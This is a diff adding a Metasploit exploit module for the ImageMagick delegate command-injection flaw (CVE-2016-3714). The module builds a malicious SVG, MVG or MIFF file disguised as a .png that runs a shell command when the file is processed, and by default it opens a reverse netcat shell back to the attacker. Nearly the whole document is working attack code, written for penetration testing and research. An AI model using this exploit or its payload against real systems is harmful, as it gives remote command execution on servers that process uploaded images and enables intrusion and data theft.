@@ -1,0 +1,87 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'ImageMagick Delegate Arbitrary Command Execution',
+      'Description'     => %q{
+        This module exploits a shell command injection in the way "delegates"
+        (commands for converting files) are processed in ImageMagick versions
+        <= 7.0.1-0 and <= 6.9.3-9 (legacy).
+
+        Since ImageMagick uses file magic to detect file format, you can create
+        a .png (for example) which is actually a crafted SVG (for example) that
+        triggers the command injection.
+
+        Tested on Linux, BSD, and OS X. You'll want to choose your payload
+        carefully due to portability concerns. Use cmd/unix/generic if need be.
+      },
+      'Author'          => [
+        'stewie',            # Vulnerability discovery
+        'Nikolay Ermishkin', # Vulnerability discovery
+        'wvu',               # Metasploit module
+        'hdm'                # Metasploit module
+      ],
+      'References'      => [
+        %w{CVE 2016-3714},
+        %w{URL https://imagetragick.com/},
+        %w{URL http://seclists.org/oss-sec/2016/q2/205},
+        %w{URL https://github.com/ImageMagick/ImageMagick/commit/06c41ab},
+        %w{URL https://github.com/ImageMagick/ImageMagick/commit/a347456}
+      ],
+      'DisclosureDate'  => 'May 3 2016',
+      'License'         => MSF_LICENSE,
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'Privileged'      => false,
+      'Payload'         => {
+        'BadChars'      => "\x22\x27\x5c", # ", ', and \
+        'Compat'        => {
+          'PayloadType' => 'cmd cmd_bash',
+          'RequiredCmd' => 'generic netcat bash-tcp'
+        }
+      },
+      'Targets'         => [
+        ['SVG file',  template: 'msf.svg'], # convert msf.png msf.svg
+        ['MVG file',  template: 'msf.mvg'], # convert msf.svg msf.mvg
+        ['MIFF file', template: 'msf.miff'] # convert -label "" msf.svg msf.miff
+      ],
+      'DefaultTarget'   => 0,
+      'DefaultOptions'  => {
+        'PAYLOAD'               => 'cmd/unix/reverse_netcat',
+        'LHOST'                 => Rex::Socket.source_address,
+        'DisablePayloadHandler' => false,
+        'WfsDelay'              => 9001
+      }
+    ))
+
+    register_options([
+      OptString.new('FILENAME', [true, 'Output file', 'msf.png'])
+    ])
+  end
+
+  def exploit
+    if target.name == 'SVG file'
+      p = Rex::Text.html_encode(payload.encoded)
+    else
+      p = payload.encoded
+    end
+
+    file_create(template.sub('echo vulnerable', p))
+  end
+
+  def template
+    File.read(File.join(
+      Msf::Config.data_directory, 'exploits', 'CVE-2016-3714', target[:template]
+    ))
+  end
+
+end
